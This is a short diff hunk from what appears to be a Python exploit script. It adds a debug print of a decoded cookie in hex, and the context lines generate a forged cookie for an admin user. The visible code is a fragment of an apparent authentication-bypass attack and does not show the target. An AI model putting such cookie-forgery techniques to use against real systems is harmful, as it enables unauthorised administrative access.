@@ -20,6 +20,7 @@ for bstr in base64_strs:
     hexdata = hexlify(data)
     s = hexdata.decode("utf-8")
     sx = r"\x" + r"\x".join(s[n : n+2] for n in range(0, len(s), 2))
+    print("[+]Cookie hex" + str(sx))
     ss= s[16:]
     print("[+] Generating new cookie for admin user")
     data_admin = ss.encode('ascii')
